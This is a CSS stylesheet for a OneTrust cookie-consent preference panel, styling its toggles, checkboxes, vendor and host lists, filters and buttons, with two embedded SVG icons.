      #onetrust-pc-sdk .ot-close-icon{
        background-image:url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB4PSIwcHgiIHk9IjBweCIgd2lkdGg9IjQ3Ljk3MSIgaGVpZ2h0PSI0Ny45NzEiIHZpZXdCb3g9IjAgMCA0Ny45NzEgNDcuOTcxIiBzdHlsZT0iZW5hYmxlLWJhY2tncm91bmQ6bmV3IDAgMCA0Ny45NzEgNDcuOTcxOyIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+PGc+PHBhdGggZD0iTTI4LjIyOCwyMy45ODZMNDcuMDkyLDUuMTIyYzEuMTcyLTEuMTcxLDEuMTcyLTMuMDcxLDAtNC4yNDJjLTEuMTcyLTEuMTcyLTMuMDctMS4xNzItNC4yNDIsMEwyMy45ODYsMTkuNzQ0TDUuMTIxLDAuODhjLTEuMTcyLTEuMTcyLTMuMDctMS4xNzItNC4yNDIsMGMtMS4xNzIsMS4xNzEtMS4xNzIsMy4wNzEsMCw0LjI0MmwxOC44NjUsMTguODY0TDAuODc5LDQyLjg1Yy0xLjE3MiwxLjE3MS0xLjE3MiwzLjA3MSwwLDQuMjQyQzEuNDY1LDQ3LjY3NywyLjIzMyw0Ny45NywzLDQ3Ljk3czEuNTM1LTAuMjkzLDIuMTIxLTAuODc5bDE4Ljg2NS0xOC44NjRMNDIuODUsNDcuMDkxYzAuNTg2LDAuNTg2LDEuMzU0LDAuODc5LDIuMTIxLDAuODc5czEuNTM1LTAuMjkzLDIuMTIxLTAuODc5YzEuMTcyLTEuMTcxLDEuMTcyLTMuMDcxLDAtNC4yNDJMMjguMjI4LDIzLjk4NnoiLz48L2c+PC9zdmc+");
        background-size:100%;
        background-repeat:no-repeat;
        background-position:center;
        height:22px;
        width:22px;
        display:inline-block}
      #onetrust-pc-sdk .group-toggle{
        display:inline-block;
        width:100%;
        margin-bottom:10px}
      #onetrust-pc-sdk .group-toggle .checkbox{
        background-color:#fff}
      #onetrust-pc-sdk .group-toggle .ot-toggle{
        float:right;
        background-color:#fff}
      #onetrust-pc-sdk .group-toggle .ot-toggle-group{
        float:right}
      #onetrust-pc-sdk .group-toggle .ot-toggle-group p{
        margin:0}
      #onetrust-pc-sdk .group-toggle .ot-toggle-group:focus{
        outline:#3b99fc auto 5px}
      #onetrust-pc-sdk .group-toggle .ot-toggle-group .checkbox input[type=checkbox]:focus+label::before{
        outline:#3b99fc auto 5px}
      #onetrust-pc-sdk .description-container h3{
        color:#263238;
        float:left;
        margin:0;
        font-weight:bold;
        font-size:1em;
        line-height:1.3;
        max-width:85%;
        top:3px}
      #onetrust-pc-sdk #pc-privacy-header{
        margin-bottom:10px}
      #onetrust-pc-sdk .category-vendors-list-container{
        overflow:hidden}
      #onetrust-pc-sdk .category-vendors-list-handler,#onetrust-pc-sdk .category-host-list-handler,#onetrust-pc-sdk .category-vendors-list-handler+a{
        display:block;
        float:left;
        color:#3860be;
        font-size:.8em;
        font-weight:bold;
        line-height:1.1;
        cursor:pointer}
      #onetrust-pc-sdk .category-vendors-list-handler:hover,#onetrust-pc-sdk .category-host-list-handler:hover,#onetrust-pc-sdk .category-vendors-list-handler+a:hover{
        color:#1883fd}
      #onetrust-pc-sdk .category-vendors-list-handler+a::after{
        content:"";
        height:15px;
        width:15px;
        background-repeat:no-repeat;
        margin-left:5px;
        float:right;
        background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 511.626 511.627'%3E%3Cg fill='%231276CE'%3E%3Cpath d='M392.857 292.354h-18.274c-2.669 0-4.859.855-6.563 2.573-1.718 1.708-2.573 3.897-2.573 6.563v91.361c0 12.563-4.47 23.315-13.415 32.262-8.945 8.945-19.701 13.414-32.264 13.414H82.224c-12.562 0-23.317-4.469-32.264-13.414-8.945-8.946-13.417-19.698-13.417-32.262V155.31c0-12.562 4.471-23.313 13.417-32.259 8.947-8.947 19.702-13.418 32.264-13.418h200.994c2.669 0 4.859-.859 6.57-2.57 1.711-1.713 2.566-3.9 2.566-6.567V82.221c0-2.662-.855-4.853-2.566-6.563-1.711-1.713-3.901-2.568-6.57-2.568H82.224c-22.648 0-42.016 8.042-58.102 24.125C8.042 113.297 0 132.665 0 155.313v237.542c0 22.647 8.042 42.018 24.123 58.095 16.086 16.084 35.454 24.13 58.102 24.13h237.543c22.647 0 42.017-8.046 58.101-24.13 16.085-16.077 24.127-35.447 24.127-58.095v-91.358c0-2.669-.856-4.859-2.574-6.57-1.713-1.718-3.903-2.573-6.565-2.573z'/%3E%3Cpath d='M506.199 41.971c-3.617-3.617-7.905-5.424-12.85-5.424H347.171c-4.948 0-9.233 1.807-12.847 5.424-3.617 3.615-5.428 7.898-5.428 12.847s1.811 9.233 5.428 12.85l50.247 50.248-186.147 186.151c-1.906 1.903-2.856 4.093-2.856 6.563 0 2.479.953 4.668 2.856 6.571l32.548 32.544c1.903 1.903 4.093 2.852 6.567 2.852s4.665-.948 6.567-2.852l186.148-186.148 50.251 50.248c3.614 3.617 7.898 5.426 12.847 5.426s9.233-1.809 12.851-5.426c3.617-3.616 5.424-7.898 5.424-12.847V54.818c-.001-4.952-1.814-9.232-5.428-12.847z'/%3E%3C/g%3E%3C/svg%3E")}
      #onetrust-pc-sdk .category-host-list-handler,#onetrust-pc-sdk .category-vendors-list-container,#onetrust-pc-sdk #pc-policy-text+.category-vendors-list-handler{
        margin-top:10px}
      #onetrust-pc-sdk .group-toggle+.category-vendors-list-container{
        margin-top:0px;
        margin-bottom:10px}
      #onetrust-pc-sdk .ot-always-active-group .group-toggle h3.category-header,#onetrust-pc-sdk .cookie-subgroup.ot-always-active-group>h6{
        max-width:70%}
      #onetrust-pc-sdk .group-description ul,#onetrust-pc-sdk .cookie-subgroups-container li.cookie-subgroup p ul{
        margin:0px;
        margin-left:15px;
        padding-bottom:8px}
      #onetrust-pc-sdk .group-description ul li,#onetrust-pc-sdk .cookie-subgroups-container li.cookie-subgroup p ul li{
        font-size:inherit;
        padding-top:8px;
        display:list-item;
        list-style:disc}
      #onetrust-pc-sdk .ot-toggle.ot-hide-tgl{
        visibility:hidden}
      #onetrust-pc-sdk .ot-toggle.ot-hide-tgl *{
        visibility:hidden}
      #onetrust-pc-sdk .cookie-subgroups-container{
        margin-top:15px}
      #onetrust-pc-sdk .cookie-subgroups-container ul.cookie-subgroups{
        margin:0;
        font-size:inherit}
      #onetrust-pc-sdk .cookie-subgroups-container ul.cookie-subgroups .cookie-subgroup-toggle{
        float:right}
      #onetrust-pc-sdk .cookie-subgroups-container ul.cookie-subgroups .cookie-subgroup-toggle.ot-always-active-subgroup{
        width:auto}
      #onetrust-pc-sdk .cookie-subgroups-container ul.cookie-subgroups .ot-toggle{
        background-color:inherit}
      #onetrust-pc-sdk .cookie-subgroups-container ul.cookie-subgroups li{
        padding:0;
        border:none;
        position:relative}
      #onetrust-pc-sdk .cookie-subgroups-container ul.cookie-subgroups li h6,#onetrust-pc-sdk .cookie-subgroups-container ul.cookie-subgroups li p{
        font-size:.82em;
        line-height:1.4}
      #onetrust-pc-sdk .cookie-subgroups-container ul.cookie-subgroups li p{
        color:dimgray;
        clear:both;
        float:left;
        margin-top:10px;
        margin-bottom:0;
        word-break:break-word;
        word-wrap:break-word}
      #onetrust-pc-sdk .cookie-subgroups-container ul.cookie-subgroups li h6{
        color:#263238;
        font-weight:bold;
        margin-bottom:0;
        float:left;
        position:relative;
        top:3px}
      #onetrust-pc-sdk .cookie-subgroups-container ul.cookie-subgroups li.cookie-subgroup{
        margin-left:30px;
        display:inline-block;
        width:calc(100% - 30px)}
      #onetrust-pc-sdk .cookie-subgroups-container .ot-arrow{
        top:-3px}
      #onetrust-pc-sdk .ot-button-group-parent{
        height:34px;
        padding:30px;
        bottom:0;
        border-top:1px solid #d8d8d8}
      #onetrust-pc-sdk .ot-button-group{
        float:right;
        text-align:center}
      #onetrust-pc-sdk .ot-pc-footer-logo{
        float:left;
        text-align:center;
        background-repeat:no-repeat;
        background-position:center;
        background-size:contain;
        width:155px;
        height:25px;
        position:relative;
        top:10px}
      #onetrust-pc-sdk #accept-recommended-btn-handler{
        float:right;
        margin-right:16px;
        margin-left:15px;
        text-align:center}
      #onetrust-pc-sdk .save-preference-btn-handler{
        height:38px;
        min-width:155px;
        background-color:#68b631;
        border-radius:2px;
        color:#fff;
        font-size:.9em;
        line-height:1.1;
        text-align:center;
        margin-left:15px;
        margin-right:15px}
      #onetrust-pc-sdk #pc-title{
        float:left;
        margin-left:10px;
        margin-top:10px;
        max-width:85%;
        overflow:hidden;
        position:relative;
        line-height:1.2em;
        max-height:2.4em;
        padding-right:1em}
      #onetrust-pc-sdk #pc-title:before{
        content:"...";
        right:0px;
        bottom:0px;
        position:absolute}
      #onetrust-pc-sdk #pc-title:after{
        position:absolute;
        content:"";
        width:1em;
        height:1em;
        right:0px;
        background:#fff}
      #onetrust-pc-sdk #vendors-list{
        height:100%;
        width:100%}
      #onetrust-pc-sdk #vendors-list .accordion-header{
        padding-top:17px;
        padding-right:15px;
        padding-bottom:17px;
        padding-left:20px;
        display:inline-block;
        width:calc(100% - 35px);
        vertical-align:middle}
      #onetrust-pc-sdk #vendors-list .accordion-text{
        padding-top:6px;
        padding-right:50px;
        padding-bottom:10px;
        padding-left:50px}
      #onetrust-pc-sdk .vendor-content{
        height:100%}
      #onetrust-pc-sdk #vendors-list-header{
        padding-top:15px;
        padding-right:30px;
        padding-bottom:15px;
        padding-left:20px;
        display:inline-block;
        width:calc(100% - 50px);
        height:20px;
        border-bottom:1px solid #d8d8d8}
      #onetrust-pc-sdk #vendors-list-header input{
        border:1px solid #d7d7d7;
        height:32px;
        width:300px;
        border-radius:50px;
        font-size:.8em;
        padding-right:35px;
        padding-left:15px;
        float:left}
      #onetrust-pc-sdk #vendors-list-header input::placeholder{
        color:#d4d4d4;
        font-style:italic}
      #onetrust-pc-sdk #vendor-list-content{
        height:calc(100% - 86px);
        width:calc(100% - 183px);
        padding-left:80px;
        padding-right:100px;
        padding-top:20px;
        margin-top:8px;
        margin-right:3px;
        margin-bottom:4px;
        margin-left:0;
        overflow-x:hidden;
        overflow-y:auto}
      #onetrust-pc-sdk #ot-back-arrow{
        height:17px;
        width:20px;
        vertical-align:middle;
        display:inline-block;
        color:dimgray;
        font-size:1em;
        line-height:1;
        text-align:center}
      #onetrust-pc-sdk #vendors-list-title{
        color:dimgray;
        font-size:.9em;
        font-weight:bold;
        line-height:1;
        display:inline-block;
        vertical-align:middle;
        margin:0;
        padding-left:5px}
      #onetrust-pc-sdk #vendors-list-title *{
        font-size:inherit}
      #onetrust-pc-sdk .navigation-container{
        float:left}
      #onetrust-pc-sdk .back-btn-handler{
        display:inline-block}
      #onetrust-pc-sdk .action-container{
        float:right;
        position:relative;
        bottom:6px}
      #onetrust-pc-sdk #search-container{
        float:left}
      #onetrust-pc-sdk #search-container svg{
        position:absolute;
        right:35px;
        width:30px;
        height:30px;
        font-size:1em;
        line-height:1;
        top:3px}
      #onetrust-pc-sdk .label-text{
        display:none}
      #onetrust-pc-sdk #filter-container{
        display:inline-block;
        top:8px;
        position:relative;
        margin-left:20px}
      #onetrust-pc-sdk #filter-btn-handler svg{
        cursor:pointer;
        width:15px;
        height:15px}
      #onetrust-pc-sdk #select-all-container{
        min-width:200px;
        min-height:30px;
        padding-left:20px}
      #onetrust-pc-sdk #select-all-text-container{
        display:inline-block;
        padding-left:30px}
      #onetrust-pc-sdk #select-all-text-container p{
        color:#2c3643;
        font-size:.8em;
        font-weight:bold;
        line-height:1.1;
        margin:0;
        display:inline-block}
      #onetrust-pc-sdk #select-all-text-container p *{
        font-size:inherit}
      #onetrust-pc-sdk #select-all-vendors-input-container,#onetrust-pc-sdk #select-all-hosts-input-container{
        float:left;
        height:100%}
      #onetrust-pc-sdk #select-all-vendors-input-container label,#onetrust-pc-sdk #select-all-hosts-input-container label{
        height:100%;
        padding-left:0}
      #onetrust-pc-sdk .ot-checkbox input[type=checkbox]{
        display:block;
        opacity:0}
      #onetrust-pc-sdk .ot-checkbox input:checked~label::before{
        background-color:#4285f4}
      #onetrust-pc-sdk .ot-checkbox label{
        position:relative;
        height:20px;
        padding-left:30px}
      #onetrust-pc-sdk .ot-checkbox label::before,#onetrust-pc-sdk .ot-checkbox label::after{
        position:absolute;
        content:"";
        display:inline-block;
        border-radius:3px}
      #onetrust-pc-sdk .ot-checkbox label::before{
        height:18px;
        width:18px;
        border:1px solid #3860be;
        left:0px}
      #onetrust-pc-sdk .ot-checkbox label::after{
        height:5px;
        width:9px;
        border-left:3px solid;
        border-bottom:3px solid;
        transform:rotate(-45deg);
        -o-transform:rotate(-45deg);
        -ms-transform:rotate(-45deg);
        -webkit-transform:rotate(-45deg);
        left:4px;
        top:5px}
      #onetrust-pc-sdk .ot-checkbox input[type=checkbox]+label::after{
        content:none;
        color:#fff}
      #onetrust-pc-sdk .ot-checkbox input[type=checkbox]:checked+label::after{
        content:""}
      #onetrust-pc-sdk .ot-checkbox input[type=checkbox]:focus+label::before{
        outline:#3860be auto 2px}
      #onetrust-pc-sdk #select-all-vendors-input-container.line-through label::after,#onetrust-pc-sdk #select-all-vendors-leg-input-container.line-through label::after,#onetrust-pc-sdk #select-all-hosts-input-container.line-through label::after{
        height:auto;
        border-left:0;
        left:5px;
        top:10.5px;
        transform:none;
        -o-transform:none;
        -ms-transform:none;
        -webkit-transform:none}
      #onetrust-pc-sdk .ot-checkbox{
        float:left}
      #onetrust-pc-sdk .vendor-title,#onetrust-pc-sdk .host-title{
        color:#2c3643;
        font-weight:bold;
        font-size:.8em;
        line-height:1.2;
        margin:0;
        height:auto;
        text-align:left;
        word-break:break-word;
        word-wrap:break-word}
      #onetrust-pc-sdk .host-title{
        position:relative;
        vertical-align:middle}
      #onetrust-pc-sdk .host-title a{
        font-size:1em;
        font-weight:bold}
      #onetrust-pc-sdk .cookie-name-container a{
        font-size:1em}
      #onetrust-pc-sdk .host-description{
        font-size:.69em;
        line-height:1.4;
        margin-top:5px;
        margin-bottom:5px;
        float:left;
        color:dimgray}
      #onetrust-pc-sdk .host-info>a{
        text-decoration:underline;
        font-size:.82em;
        position:relative;
        z-index:2;
        float:left;
        width:100%;
        margin-bottom:5px}
      #onetrust-pc-sdk .host-info .host-title+a{
        margin-top:5px}
      #onetrust-pc-sdk .vendor-info{
        width:88%;
        float:right}
      #onetrust-pc-sdk .vendor-purposes{
        margin-top:3px}
      #onetrust-pc-sdk .vendor-purposes p{
        font-size:.8em;
        line-height:1.2;
        margin-bottom:0;
        font-weight:500;
        text-align:left;
        word-break:break-word;
        word-wrap:break-word}
      #onetrust-pc-sdk input[type=checkbox]:focus+.accordion-header{
        outline:auto;
        outline-color:#007bff}
      #onetrust-pc-sdk #select-all-hosts-input-container input[type=checkbox],#onetrust-pc-sdk #select-all-vendors-input-container input[type=checkbox]{
        position:absolute}
      #onetrust-pc-sdk #vendors-list-container input[type=checkbox],#onetrust-pc-sdk #hosts-list-container input[type=checkbox],#onetrust-pc-sdk .cookie-subgroups input[type=checkbox]{
        position:absolute;
        cursor:pointer;
        width:100%;
        height:100%;
        opacity:0;
        margin:0;
        top:0;
        left:0}
      #onetrust-pc-sdk #vendors-list-container input[type=checkbox]~.accordion-header,#onetrust-pc-sdk #hosts-list-container input[type=checkbox]~.accordion-header,#onetrust-pc-sdk .cookie-subgroups input[type=checkbox]~.accordion-header{
        cursor:pointer}
      #onetrust-pc-sdk #vendors-list-container input[type=checkbox]:not(:checked)~.accordion-text,#onetrust-pc-sdk #hosts-list-container input[type=checkbox]:not(:checked)~.accordion-text,#onetrust-pc-sdk .cookie-subgroups input[type=checkbox]:not(:checked)~.accordion-text{
        margin-top:0;
        max-height:0;
        opacity:0;
        overflow:hidden;
        width:100%;
        transition:.25s ease-out;
        display:none}
      #onetrust-pc-sdk #vendors-list-container input[type=checkbox]:checked~.accordion-text,#onetrust-pc-sdk #hosts-list-container input[type=checkbox]:checked~.accordion-text,#onetrust-pc-sdk .cookie-subgroups input[type=checkbox]:checked~.accordion-text{
        transition:.1s ease-in;
        display:block}
      #onetrust-pc-sdk #vendors-list-container .ot-checkbox input[type=checkbox],#onetrust-pc-sdk #hosts-list-container .ot-checkbox input[type=checkbox],#onetrust-pc-sdk .cookie-subgroups .ot-checkbox input[type=checkbox]{
        width:auto;
        height:auto}
      #onetrust-pc-sdk #vendors-list-container .ot-checkbox label,#onetrust-pc-sdk #hosts-list-container .ot-checkbox label,#onetrust-pc-sdk .cookie-subgroups .ot-checkbox label{
        z-index:2}
      #onetrust-pc-sdk #vendors-list-container,#onetrust-pc-sdk #hosts-list-container{
        width:100%}
      #onetrust-pc-sdk #vendors-list-container li,#onetrust-pc-sdk #hosts-list-container li{
        border:1px solid #d7d7d7;
        border-radius:2px;
        position:relative;
        margin-top:10px}
      #onetrust-pc-sdk #vendors-list-container .ot-toggle-group{
        width:65%}
      #onetrust-pc-sdk #hosts-list-container .ot-toggle-group{
        width:65%}
      #onetrust-pc-sdk label{
        margin-bottom:0}
      #onetrust-pc-sdk .vendor-notice,#onetrust-pc-sdk .host-notice{
        float:right}
      #onetrust-pc-sdk .vendor-privacy-notice-container,#onetrust-pc-sdk .third-party-cookies-container{
        float:left}
      #onetrust-pc-sdk .vendor-privacy-notice-container{
        position:relative}
      #onetrust-pc-sdk .vendor-privacy-notice-container a:hover{
        text-decoration:underline}
      #onetrust-pc-sdk .vendor-privacy-notice,#onetrust-pc-sdk .third-party-cookie-notice{
        color:dimgray;
        font-size:.7em;
        line-height:.9;
        display:inline-block}
      #onetrust-pc-sdk .vendor-privacy-notice *,#onetrust-pc-sdk .third-party-cookie-notice *{
        font-size:inherit}
      #onetrust-pc-sdk .vendor-privacy-notice{
        position:relative;
        z-index:2}
      #onetrust-pc-sdk .ot-arrow{
        margin-left:20px}
      #onetrust-pc-sdk .vendor-options{
        display:inline-block;
        width:100%;
        padding-bottom:10px;
        border-radius:2px;
        background-color:#f8f8f8}
      #onetrust-pc-sdk .vendor-options p{
        font-size:.69em;
        color:gray;
        text-align:left;
        display:table-cell;
        vertical-align:middle;
        word-break:break-word;
        word-wrap:break-word;
        margin:0;
        padding-left:15px;
        color:#2e3644}
      #onetrust-pc-sdk #hosts-list-container .host-info{
        float:left;
        width:calc(100% - 50px)}
      #onetrust-pc-sdk #hosts-list-container .host-option-group{
        display:inline-block;
        width:100%;
        margin:0;
        font-size:inherit}
      #onetrust-pc-sdk #hosts-list-container .host-option-group li.vendor-host{
        border:none;
        padding:0;
        font-size:.8em;
        color:dimgray;
        float:left;
        text-align:left;
        padding:10px;
        margin-bottom:10px;
        width:calc(100% - 10px);
        background-color:#f8f8f8}
      #onetrust-pc-sdk #hosts-list-container .host-option-group li.vendor-host a{
        color:dimgray}
      #onetrust-pc-sdk #hosts-list-container .host-option-group li>div div{
        font-size:.81em;
        padding:5px 0}
      #onetrust-pc-sdk #hosts-list-container .host-option-group li>div div:nth-child(1){
        width:30%;
        float:left}
      #onetrust-pc-sdk #hosts-list-container .host-option-group li>div div:nth-child(2){
        width:70%;
        float:left;
        word-break:break-word;
        word-wrap:break-word}
      #onetrust-pc-sdk .vendor-purpose-groups .vendor-option-purpose{
        border-top:1px solid #e9e9e9;
        border-bottom:1px solid #e9e9e9;
        margin-bottom:10px;
        min-height:30px;
        max-height:50px;
        width:100%;
        display:table}
      #onetrust-pc-sdk .vendor-purpose-groups .vendor-option-purpose:first-child,#onetrust-pc-sdk .vendor-purpose-groups .vendor-option-purpose:first-of-type{
        border-top:none}
      #onetrust-pc-sdk .vendor-purpose-groups .vendor-option-purpose p{
        font-weight:bold}
      #onetrust-pc-sdk .vendor-purpose-groups .vendor-consent-group{
        display:inline-block;
        width:100%;
        margin-bottom:10px}
      #onetrust-pc-sdk .vendor-purpose-groups .legitimate-interest-group .consent-category{
        float:left}
      #onetrust-pc-sdk .vendor-purpose-groups .vendor-opt-out-handler{
        text-decoration:none;
        float:right;
        font-size:.69em;
        line-height:1.4;
        color:#3860be;
        right:15px;
        position:relative}
      #onetrust-pc-sdk .vendor-purpose-groups .vendor-opt-out-handler span{
        font-size:.69em;
        line-height:1.4}
      #onetrust-pc-sdk .vendor-purpose-groups .vendor-opt-out-handler svg{
        width:15px;
        height:15px;
        vertical-align:middle}
      #onetrust-pc-sdk #no-results{
        text-align:center;
        margin-top:30px}
      #onetrust-pc-sdk #no-results p{
        font-size:1em;
        color:#2e3644;
        word-break:break-word;
        word-wrap:break-word}
      #onetrust-pc-sdk #no-results p span{
        font-weight:bold}
      #onetrust-pc-sdk .ot-toggle .checkbox label:after{
        cursor:pointer}
      #onetrust-pc-sdk .ot-group-option{
        height:25px}
      #onetrust-pc-sdk .checkbox{
        position:relative;
        display:inline-block}
      #onetrust-pc-sdk .checkbox label{
        background:#d6d6d6;
        border:none;
        height:10px;
        width:35px;
        position:relative;
        display:inline-block;
        border-radius:46px;
        transition:.4s}
      #onetrust-pc-sdk .checkbox label:after{
        content:"";
        position:absolute;
        width:20px;
        height:20px;
        border-radius:100%;
        left:0;
        top:-5px;
        z-index:2;
        background:#7b7b7b;
        transition:.4s}
      #onetrust-pc-sdk .checkbox input{
        position:absolute;
        left:0;
        top:0;
        width:100%;
        height:100%;
        z-index:5;
        opacity:0;
        cursor:pointer}
      #onetrust-pc-sdk .checkbox input:checked+label:after{
        left:40px}
      #onetrust-pc-sdk .checkbox input:focus+label::after{
        outline:#3b99fc solid 1px}
      #onetrust-pc-sdk .checkbox:after,#onetrust-pc-sdk .checkbox:before{
        -webkit-font-feature-settings:normal;
        font-feature-settings:normal;
        -webkit-font-kerning:auto;
        font-kerning:auto;
        -webkit-font-language-override:normal;
        font-language-override:normal;
        font-stretch:normal;
        font-style:normal;
        font-synthesis:weight style;
        font-variant:normal;
        font-weight:normal;
        text-rendering:auto}
      #onetrust-pc-sdk .ot-toggle{
        background-color:#f8f8f8}
      #onetrust-pc-sdk .ot-toggle .checkbox input:checked+label{
        background:#cddcf2}
      #onetrust-pc-sdk .ot-toggle .checkbox input:checked+label:after{
        background:#4285f4;
        left:16px}
      #onetrust-pc-sdk .ot-toggle-group,#onetrust-pc-sdk .ot-toggle{
        display:inline-block;
        vertical-align:middle}
      #onetrust-pc-sdk .ot-arrow-container{
        float:right}
      #onetrust-pc-sdk .ot-arrow{
        top:2px;
        position:relative;
        width:10px;
        height:10px;
        margin-left:5px;
        transition:all 300ms ease-in 0s;
        -webkit-transition:all 300ms ease-in 0s;
        -moz-transition:all 300ms ease-in 0s;
        -o-transition:all 300ms ease-in 0s}
      #onetrust-pc-sdk input:checked~.accordion-header .ot-arrow{
        transform:rotate(90deg);
        -o-transform:rotate(90deg);
        -ms-transform:rotate(90deg);
        -webkit-transform:rotate(90deg)}
      #onetrust-pc-sdk button.ot-pill{
        font-size:.75em;
        text-align:center;
        background-color:#3860be;
        border-color:#3860be;
        font-weight:600;
        box-shadow:0 0 10px 1px #cce1ff;
        width:170px;
        max-width:180px;
        color:#fff;
        height:auto;
        white-space:normal;
        word-break:break-word;
        word-wrap:break-word;
        padding:10px;
        line-height:1.2;
        letter-spacing:.05em}
      #onetrust-pc-sdk button.ot-pill:first-child{
        margin-top:10px}
      #onetrust-pc-sdk.ot-leg-opt-out .description-container{
        padding-top:0px;
        margin-top:20px;
        padding-right:0px;
        border-radius:3px;
        overflow:hidden;
        padding-bottom:10px}
      #onetrust-pc-sdk.ot-leg-opt-out .ot-leg-border-color{
        border:1px solid #e9e9e9}
      #onetrust-pc-sdk.ot-leg-opt-out .ot-leg-border-color .cookie-subgroups-container{
        border-top:1px solid #e9e9e9}
      #onetrust-pc-sdk.ot-leg-opt-out .ot-category-desc{
        padding-bottom:10px}
      #onetrust-pc-sdk.ot-leg-opt-out .group-toggle{
        padding-left:10px;
        width:calc(100% - 20px);
        padding-top:10px;
        margin-bottom:0px;
        padding-bottom:8px}
      #onetrust-pc-sdk.ot-leg-opt-out .cookie-subgroups-container{
        padding-top:10px;
        margin-top:0px}
      #onetrust-pc-sdk.ot-leg-opt-out .description-container>*:not(.group-toggle){
        padding-left:10px;
        padding-right:10px}
      #onetrust-pc-sdk.ot-leg-opt-out .leg-int-header{
        overflow:hidden;
        padding-top:7.5px;
        padding-bottom:7.5px;
        background-color:#f8f8f8;
        border:none;
        border-bottom:1px solid #e9e9e9}
      #onetrust-pc-sdk.ot-leg-opt-out .leg-int-header .leg-int-title{
        float:right;
        font-size:13px}
      #onetrust-pc-sdk.ot-leg-opt-out .leg-int-header span:first-child{
        text-align:left;
        max-width:80px}
      #onetrust-pc-sdk.ot-leg-opt-out .leg-int-header span:last-child{
        padding-right:10px;
        max-width:95px;
        text-align:center}
      #onetrust-pc-sdk.ot-leg-opt-out .description-container .ot-toggle-group:first-of-type{
        padding-left:36px;
        padding-right:7px}
      #onetrust-pc-sdk.ot-leg-opt-out .ot-always-active-group .group-toggle .ot-toggle-group:first-of-type{
        padding-left:0px}
      #onetrust-pc-sdk.ot-leg-opt-out .category-header,#onetrust-pc-sdk.ot-leg-opt-out .cookie-subgroup h6{
        max-width:calc(100% - 115px)}
      #onetrust-pc-sdk.ot-leg-opt-out #vendor-list-content:not(.host-list-content) #select-all-container{
        width:100%;
        display:inline-block;
        padding:0}
      #onetrust-pc-sdk.ot-leg-opt-out #vendor-list-content:not(.host-list-content) #select-all-container .ot-checkbox{
        float:right}
      #onetrust-pc-sdk.ot-leg-opt-out .leg-int-sel-all-hdr{
        float:right;
        position:relative;
        height:20px;
        right:55px}
      #onetrust-pc-sdk.ot-leg-opt-out .consent-hdr,#onetrust-pc-sdk.ot-leg-opt-out .leg-int-hdr{
        float:right;
        font-size:.8em;
        position:relative}
      #onetrust-pc-sdk.ot-leg-opt-out .leg-int-hdr{
        margin-right:30px}
      #onetrust-pc-sdk.ot-leg-opt-out .ot-vendor-consent-tgl{
        margin-left:62px;
        margin-right:38px}
      #onetrust-pc-sdk.ot-leg-opt-out .ot-vendor-consent-tgl label,#onetrust-pc-sdk.ot-leg-opt-out .ot-leg-int-tgl label{
        width:22px;
        padding:0}
      #onetrust-pc-sdk.ot-leg-opt-out .ot-leg-int-tgl-only{
        margin-right:122px}
      #onetrust-pc-sdk.ot-leg-opt-out #select-all-vendors-leg-input-container{
        display:block;
        width:21px;
        height:21px;
        position:relative;
        float:left;
        right:30px;
        clear:both}
      #onetrust-pc-sdk.ot-leg-opt-out #select-all-vendors-leg-input-container input{
        position:absolute}
      #onetrust-pc-sdk.ot-leg-opt-out #select-all-vendors-input-container{
        float:right;
        width:21px;
        height:21px;
        position:relative;
        right:70px}
      #onetrust-pc-sdk.ot-leg-opt-out #vendors-list-container .vendor-info{
        float:left;
        width:60%}
      #onetrust-pc-sdk.ot-leg-opt-out #vendors-list-container .ot-toggle-group{
        float:right;
        width:auto}
      #onetrust-pc-sdk.ot-leg-opt-out #vendors-list-container .ot-checkbox{
        position:relative}
      #onetrust-pc-sdk.ot-leg-btn #select-all-vendors-input-container{
        clear:both}
      #onetrust-pc-sdk #ot-triangle{
        border:12px solid transparent;
        display:none;
        position:absolute;
        z-index:2147483647;
        top:140px;
        right:40px;
        transform:rotate(45deg);
        -o-transform:rotate(45deg);
        -ms-transform:rotate(45deg);
        -webkit-transform:rotate(45deg);
        background-color:#fff;
        -webkit-box-shadow:-3px -3px 5px -2px #c7c5c7;
        -moz-box-shadow:-3px -3px 5px -2px #c7c5c7;
        box-shadow:-3px -3px 5px -2px #c7c5c7}
      #onetrust-pc-sdk #ot-filter-modal{
        width:300px;
        position:absolute;
        z-index:2147483646;
        top:146px;
        height:auto;
        display:none;
        -moz-transition:.2s ease;
        -o-transition:.2s ease;
        -webkit-transition:2s ease;
        transition:.2s ease;
        overflow-x:hidden;
        opacity:1;
        right:0}
      #onetrust-pc-sdk #ot-filter-modal .ot-pill{
        width:130px;
        float:right}
      #onetrust-pc-sdk #ot-options{
        background-color:#fff;
        height:auto;
        margin:5px;
        border-radius:3px;
        height:350px;
        -webkit-box-shadow:0px 0px 12px 2px #c7c5c7;
        -moz-box-shadow:0px 0px 12px 2px #c7c5c7;
        box-shadow:0px 0px 12px 2px #c7c5c7}
      #onetrust-pc-sdk .ot-group-options{
        overflow-y:auto;
        width:100%;
        max-height:65%}
      #onetrust-pc-sdk .ot-group-option{
        margin-bottom:25px;
        margin-left:15px;
        clear:both}
      #onetrust-pc-sdk .ot-group-option span{
        cursor:pointer;
        color:dimgray;
        font-size:.8em;
        line-height:1.1;
        font-weight:normal}
      #onetrust-pc-sdk #clear-filters-handler{
        float:right;
        max-width:200px;
        margin-bottom:30px;
        text-decoration:none}
      #onetrust-pc-sdk #clear-filters-handler p{
        float:right;
        font-weight:bold;
        color:#3860be;
        font-size:.9em;
        margin:0}
      #onetrust-pc-sdk #clear-filters-handler p:hover{
        color:#1883fd}
      #onetrust-pc-sdk #clear-filters-container{
        float:right;
        padding-right:15px;
        height:auto;
        margin-top:20px}
      #onetrust-pc-sdk #filter-apply-handler{
        margin-right:10px;
        float:right}
      #onetrust-pc-sdk .group-description+.ot-leg-btn-container{
        margin-top:0}
      #onetrust-pc-sdk .ot-leg-btn-container{
        display:inline-block;
        width:100%;
        margin-top:10px}
      #onetrust-pc-sdk .ot-leg-btn-container button{
        height:32px;
        padding:6.5px 8px;
        margin-bottom:0;
        line-height:18px;
        letter-spacing:0}
      #onetrust-pc-sdk .ot-leg-btn-container button:focus{
        outline:0}
      #onetrust-pc-sdk .ot-leg-btn-container svg{
        display:none;
        height:14px;
        width:14px;
        padding-right:5px;
        vertical-align:sub}
